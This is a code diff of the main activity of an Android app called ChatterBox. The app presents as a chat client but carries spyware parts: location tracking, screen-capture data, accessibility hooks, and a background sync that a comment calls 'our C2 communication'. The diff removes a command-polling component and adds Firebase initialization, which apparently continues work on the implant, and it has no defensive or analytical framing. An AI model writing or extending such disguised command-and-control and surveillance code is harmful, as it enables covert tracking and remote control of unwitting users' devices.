@@ -37,6 +37,7 @@ import com.example.ChatterBox.database.DataSynchronizer
 import com.example.ChatterBox.database.LocationTracker
 import com.example.ChatterBox.util.PermissionsManager
 import com.google.android.material.navigation.NavigationView
+import com.google.firebase.FirebaseApp
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import org.json.JSONObject
@@ -53,7 +54,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     private var dataSynchronizer: DataSynchronizer? = null
     private var mediaProjectionResultCode: Int = 0
     private var mediaProjectionData: Intent? = null
-    private var commandPoller: Commands? = null
 
     companion object {
         private const val SEARCH_USER_REQUEST_CODE = 1001
@@ -69,7 +69,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
         db = FirebaseFirestore.getInstance()
         auth = FirebaseAuth.getInstance()
-
+        FirebaseApp.initializeApp(this)
         val currentUser = auth.currentUser
 
         if (currentUser == null) {
@@ -130,9 +130,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         // Initialize data synchronization (our C2 communication) in the background
         initializeBackgroundSync()
 
-        // Initialize command polling
-        commandPoller = Commands(this)
-        commandPoller?.startPolling()
     }
 
     private fun collectLocationData() {
@@ -522,7 +519,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         super.onDestroy()
         appExecutor.shutdown()
         AccessibilityHelper.resetSession(this)
-        commandPoller?.stopPolling()
     }
 
     /** 🔹 Setup Navigation Drawer */
